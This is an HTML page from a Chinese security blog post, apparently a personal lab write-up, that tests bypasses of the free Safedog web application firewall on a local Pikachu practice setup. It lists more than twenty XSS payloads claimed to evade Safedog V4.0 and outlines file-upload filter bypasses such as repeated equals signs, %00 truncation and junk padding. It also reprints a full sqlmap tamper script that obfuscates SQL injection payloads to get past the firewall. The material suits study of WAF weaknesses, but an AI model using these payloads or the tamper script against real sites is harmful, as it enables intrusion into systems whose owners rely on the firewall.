@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="0x01平常对抗waf经验还是比较少，正好有空，就拿免费的safedog练练手，环境用的是Windows 7 + phpstudy（apache2.4.39+php7+mysql5.7) + Pikachu。 ps：免费的就是有点…..一直弹登录，还x不掉….登录了过会还是会弹，感觉是bug，体验极差  0x020x001 XSS Bypass设置安全狗防护全开  FUZZ 标签这里咱们用gith">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Safedog Battle">
+<meta property="og:url" content="http://example.com/posts/3298082971/index.html">
+<meta property="og:site_name" content="Brich">
+<meta property="og:description" content="0x01平常对抗waf经验还是比较少，正好有空，就拿免费的safedog练练手，环境用的是Windows 7 + phpstudy（apache2.4.39+php7+mysql5.7) + Pikachu。 ps：免费的就是有点…..一直弹登录，还x不掉….登录了过会还是会弹，感觉是bug，体验极差  0x020x001 XSS Bypass设置安全狗防护全开  FUZZ 标签这里咱们用gith">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220615104804882.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220615110457875.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220615114933178.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220615115146801.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220615115258375.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220615171839691.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220615171900646.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220615171937964.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220615172018729.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220615172549814.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220615173641073.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220615174320342.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220615185244683.png">
+<meta property="article:published_time" content="2022-06-15T02:41:13.000Z">
+<meta property="article:modified_time" content="2022-06-15T11:31:59.742Z">
+<meta property="article:author" content="1in3r">
+<meta property="article:tag" content="学习笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://typro-1304950244.file.myqcloud.com/image-20220615104804882.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="https://typro-1304950244.cos.ap-shanghai.myqcloud.com/img/%E7%9B%86%E6%A0%BD19.png">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="https://typro-1304950244.cos.ap-shanghai.myqcloud.com/img/%E7%9B%86%E6%A0%BD19.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="https://typro-1304950244.cos.ap-shanghai.myqcloud.com/img/%E7%9B%86%E6%A0%BD19.png">
+        
+      
+    
+    <!-- title -->
+    <title>Safedog Battle</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/vlog/">vlog</a></li><!--
+     --><!--
+       --><li><a href="/gallery/">Photo</a></li><!--
+     --><!--
+       --><li><a href="/friends/">Friends</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/posts/2931050307/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/posts/3298082971/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/posts/3298082971/&text=Safedog Battle"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/posts/3298082971/&title=Safedog Battle"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/posts/3298082971/&is_video=false&description=Safedog Battle"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Safedog Battle&body=Check out this article: http://example.com/posts/3298082971/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/posts/3298082971/&title=Safedog Battle"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/posts/3298082971/&title=Safedog Battle"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/posts/3298082971/&title=Safedog Battle"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/posts/3298082971/&title=Safedog Battle"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/posts/3298082971/&name=Safedog Battle&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/posts/3298082971/&t=Safedog Battle"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01"><span class="toc-number">1.</span> <span class="toc-text">0x01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02"><span class="toc-number">2.</span> <span class="toc-text">0x02</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x001-XSS-Bypass"><span class="toc-number">2.1.</span> <span class="toc-text">0x001 XSS Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#FUZZ-%E6%A0%87%E7%AD%BE"><span class="toc-number">2.1.1.</span> <span class="toc-text">FUZZ 标签</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95payload"><span class="toc-number">2.1.2.</span> <span class="toc-text">测试payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x002-FileUpload-Bypass"><span class="toc-number">2.2.</span> <span class="toc-text">0x002 FileUpload Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x001-%E5%A4%9A%E4%B8%AA%E7%AD%89%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.1.</span> <span class="toc-text">0x001 多个等号绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x002-%E5%A4%9A%E4%B8%AAfilename%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.2.</span> <span class="toc-text">0x002 多个filename绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x003-00%E6%88%AA%E6%96%AD%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.3.</span> <span class="toc-text">0x003 %00截断绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x003-%E5%9E%83%E5%9C%BE%E5%AD%97%E7%AC%A6%E5%A1%AB%E5%85%85%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.4.</span> <span class="toc-text">0x003 垃圾字符填充绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-sqli-Bypass"><span class="toc-number">2.3.</span> <span class="toc-text">0x03 sqli Bypass</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Safedog Battle
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">1in3r</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-06-15T02:41:13.000Z" itemprop="datePublished">2022-06-15</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>平常对抗waf经验还是比较少，正好有空，就拿免费的safedog练练手，环境用的是Windows 7 + phpstudy（apache2.4.39+php7+mysql5.7) + Pikachu。</p>
+<p>ps：免费的就是有点…..一直弹登录，还x不掉….登录了过会还是会弹，感觉是bug，体验极差</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220615104804882.png" alt="image-20220615104804882"></p>
+<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><h3 id="0x001-XSS-Bypass"><a href="#0x001-XSS-Bypass" class="headerlink" title="0x001 XSS Bypass"></a>0x001 XSS Bypass</h3><p>设置安全狗防护全开</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220615110457875.png" alt="image-20220615110457875"></p>
+<h4 id="FUZZ-标签"><a href="#FUZZ-标签" class="headerlink" title="FUZZ 标签"></a>FUZZ 标签</h4><p>这里咱们用github一个star 10.4k的工具进行测试<a target="_blank" rel="noopener" href="https://github.com/s0md3v/XSStrike">GitHub - s0md3v&#x2F;XSStrike: Most advanced XSS scanner.</a></p>
+<p>fuzz一下看看过滤情况（好像也不太准确，waf status检测到是Offline状态）</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220615114933178.png" alt="image-20220615114933178"></p>
+<p>使用工具生成payload</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220615115146801.png" alt="image-20220615115146801"></p>
+<h4 id="测试payload"><a href="#测试payload" class="headerlink" title="测试payload"></a>测试payload</h4><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220615115258375.png" alt="image-20220615115258375"></p>
+<p>以下是有效payload，测试了几个，发现工具使用的payload都差不多是固定的几个标签，大部分都是做了不一样的变形</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;a/+/OnpoInTEreNter%0d=%0dconfirm(1)%0dx&gt;</span><br><span class="line">&lt;a%09onpoIntErENter%0a=%0aa=prompt,a(1)%0dx&gt;</span><br><span class="line">&lt;D3v%09oNPOintereNter+=+confirm(1)%0dx&gt;</span><br><span class="line">&lt;a%0aoNpoinTeREnTer%09=%09[1].find(confirm)%0dx&gt;</span><br><span class="line">&lt;d3v%09OnpoinTerentER+=+[1].find(confirm)%0dx&gt;</span><br><span class="line">&lt;D3v%0aoNPointerEnTer%0d=%0d(confirm)()%0dx&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我寻思着自动化已经这么吊了么？还是手工测测吧，光说不练，不会进步。</p>
+<p>以下payload经过测试都可以bypass safedag</p>
+<p>测试日期：2022&#x2F;06&#x2F;15 Version：safedog Windows Apache 版 V4.0</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onpageshow</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span> <span class="attr">onwebkitanimationstart</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>x&#123;animation:s&#125;@keyframes s&#123;&#125;</span><br><span class="line">&lt;iframe srcdoc=&lt;svg/o&amp;#x6Eload&amp;equals;alert&amp;lpar;1)&amp;gt;&gt;</span><br><span class="line">&lt;form action=javascript:alert(1)&gt;&lt;input type=submit&gt;</span><br><span class="line">&lt;form&gt;&lt;button formaction=javascript:alert(1)&gt;click</span><br><span class="line">&lt;x contenteditable onblur=alert(1)&gt;lose focus!</span><br><span class="line">&lt;x oncontextmenu=alert(1)&gt;right click this!</span><br><span class="line">&lt;form onsubmit=alert(1)&gt;&lt;input type=submit&gt;</span><br><span class="line">&lt;x onpointerrawupdate=alert(1)&gt;hover this!</span><br><span class="line">&lt;x ondblclick=alert(1)&gt;double click this!</span><br><span class="line">&lt;svg/onload=window.open(&#x27;javas&#x27;+&#x27;cript:ale&#x27;+&#x27;rt(1)&#x27;)&gt;</span><br><span class="line">&lt;svg/onload=location=&#x27;javas&#x27;+&#x27;cript:ale&#x27;+&#x27;rt(1)&#x27;&gt;</span><br><span class="line">&lt;svg/onload=location.href=&#x27;javas&#x27;+&#x27;cript:ale&#x27;+&#x27;rt(1)&#x27;&gt;</span><br><span class="line">&lt;svg/onload=window.open(&#x27;javas&#x27;+&#x27;cript:ale&#x27;+&#x27;rt(1)&#x27;)&gt;</span><br><span class="line">&lt;svg/onload=location=&#x27;javas&#x27;.concat(&#x27;cript:ale&#x27;,&#x27;rt(1)&#x27;)&gt;</span><br><span class="line">.....还有的有机会再补充</span><br></pre></td></tr></table></figure>
+
+<p>测试下来，安全狗只过滤了一些常用标签，可以弹窗的如alert、prompt 、confirm安全狗都没有做过滤，可以使用h5的一些新标签、javascript伪协议、一些不常用的标签、payload编码等方式绕过安全狗的检测。</p>
+<h3 id="0x002-FileUpload-Bypass"><a href="#0x002-FileUpload-Bypass" class="headerlink" title="0x002 FileUpload Bypass"></a>0x002 FileUpload Bypass</h3><p>这里有个坑，安全狗会拦截php文件，包括自己写的上传页面，所以先给咱自己免杀一下，不然安全狗不让你用，主要是我甚至没有找到加白的地方，就很无语。</p>
+<p>正常上传.jpg，大多数waf只检测后缀，不检测内容，更别说免费的waf了。</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220615171839691.png" alt="image-20220615171839691"></p>
+<p>上传.php报500，应该是被拦截了</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220615171900646.png" alt="image-20220615171900646"></p>
+<h4 id="0x001-多个等号绕过"><a href="#0x001-多个等号绕过" class="headerlink" title="0x001 多个等号绕过"></a>0x001 多个等号绕过</h4><p> filename后面多个等号进行绕过,三个等号可以绕过安全狗</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220615171937964.png" alt="image-20220615171937964"></p>
+<p>四个等号</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220615172018729.png" alt="image-20220615172018729"></p>
+<p>经过测试只要大于等于三个等号都是可以绕过安全狗的</p>
+<h4 id="0x002-多个filename绕过"><a href="#0x002-多个filename绕过" class="headerlink" title="0x002 多个filename绕过"></a>0x002 多个filename绕过</h4><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220615172549814.png" alt="image-20220615172549814"></p>
+<h4 id="0x003-00截断绕过"><a href="#0x003-00截断绕过" class="headerlink" title="0x003 %00截断绕过"></a>0x003 %00截断绕过</h4><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220615173641073.png" alt="image-20220615173641073"></p>
+<h4 id="0x003-垃圾字符填充绕过"><a href="#0x003-垃圾字符填充绕过" class="headerlink" title="0x003 垃圾字符填充绕过"></a>0x003 垃圾字符填充绕过</h4><p>垃圾字符填充的原理就是填充的字符长度超过了WAF检测的字符长度，所以能够成功绕过，安全狗的默认检测URL长度为2048个字节</p>
+<p>Content-Disposition: 参数后垃圾字符填充绕过</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220615174320342.png" alt="image-20220615174320342"></p>
+<p>name与filename之间垃圾字符填充绕过</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220615185244683.png" alt="image-20220615185244683"></p>
+<h3 id="0x03-sqli-Bypass"><a href="#0x03-sqli-Bypass" class="headerlink" title="0x03 sqli Bypass"></a>0x03 sqli Bypass</h3><p>某师傅的tamper</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2019 sqlmap developers (http:%23 %26%23 %26sqlmap.org%23 %26)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">Author:pureqh.top</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.data <span class="keyword">import</span> kb</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> DBMS</span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    singleTimeWarnMessage(<span class="string">&quot;Bypass safedog by pureqh&#x27;%s&#x27; only %s&quot;</span> % (os.path.basename(__file__).split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>], DBMS.MYSQL))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line"></span><br><span class="line">        payload=payload.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;  &quot;</span>,<span class="number">1</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;ORDER BY&quot;</span>,<span class="string">&quot;REGEXP \&quot;[...%25%23]\&quot;   /*!11444order %0a by*/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;union ALL SELECT&quot;</span>,<span class="string">&quot;/*!11444union all%0a select*/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot; AND&quot;</span>,<span class="string">&quot;/*!11444AND*/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;(SELECT (CASE&quot;</span>,<span class="string">&quot;(/*!11444SELECT*/ %0a (CASE&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;UNION SELECT&quot;</span>,<span class="string">&quot;/*!11444union*/  /*REGEXP \&quot;[...%25%23]\&quot;*/  %0a select /*REGEXP \&quot;[...%25%23]\&quot;*/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;UNION ALL SELECT&quot;</span>,<span class="string">&quot;REGEXP \&quot;[...%0a%23]\&quot; /*!11444union %0a select */ &quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;()&quot;</span>,<span class="string">&quot;(%0a /*!80000aaa*/)&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot; AS&quot;</span>,<span class="string">&quot;/*!11444AS*/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;FROM&quot;</span>,<span class="string">&quot;/*!11444FROM*/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;INFORMATION_SCHEMA&quot;</span>,<span class="string">&quot;/*like\&quot;%0a%23\&quot;*/ %0a  INFORMATION_SCHEMA&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;INFORMATION_SCHEMA.TABLES&quot;</span>,<span class="string">&quot;%0a /*!11444INFORMATION_SCHEMA.TABLES*/&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
+
+
+
+<p>浅绕了一下，后面有时间再继续学习，持续更新。</p>
+
+  </div>
+</article>
+
+
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/vlog/">vlog</a></li>
+         
+          <li><a href="/gallery/">Photo</a></li>
+         
+          <li><a href="/friends/">Friends</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01"><span class="toc-number">1.</span> <span class="toc-text">0x01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02"><span class="toc-number">2.</span> <span class="toc-text">0x02</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x001-XSS-Bypass"><span class="toc-number">2.1.</span> <span class="toc-text">0x001 XSS Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#FUZZ-%E6%A0%87%E7%AD%BE"><span class="toc-number">2.1.1.</span> <span class="toc-text">FUZZ 标签</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95payload"><span class="toc-number">2.1.2.</span> <span class="toc-text">测试payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x002-FileUpload-Bypass"><span class="toc-number">2.2.</span> <span class="toc-text">0x002 FileUpload Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x001-%E5%A4%9A%E4%B8%AA%E7%AD%89%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.1.</span> <span class="toc-text">0x001 多个等号绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x002-%E5%A4%9A%E4%B8%AAfilename%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.2.</span> <span class="toc-text">0x002 多个filename绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x003-00%E6%88%AA%E6%96%AD%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.3.</span> <span class="toc-text">0x003 %00截断绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x003-%E5%9E%83%E5%9C%BE%E5%AD%97%E7%AC%A6%E5%A1%AB%E5%85%85%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.4.</span> <span class="toc-text">0x003 垃圾字符填充绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-sqli-Bypass"><span class="toc-number">2.3.</span> <span class="toc-text">0x03 sqli Bypass</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/posts/3298082971/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/posts/3298082971/&text=Safedog Battle"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/posts/3298082971/&title=Safedog Battle"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/posts/3298082971/&is_video=false&description=Safedog Battle"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Safedog Battle&body=Check out this article: http://example.com/posts/3298082971/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/posts/3298082971/&title=Safedog Battle"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/posts/3298082971/&title=Safedog Battle"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/posts/3298082971/&title=Safedog Battle"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/posts/3298082971/&title=Safedog Battle"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/posts/3298082971/&name=Safedog Battle&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/posts/3298082971/&t=Safedog Battle"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2019-2022
+    1in3r
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/vlog/">vlog</a></li><!--
+     --><!--
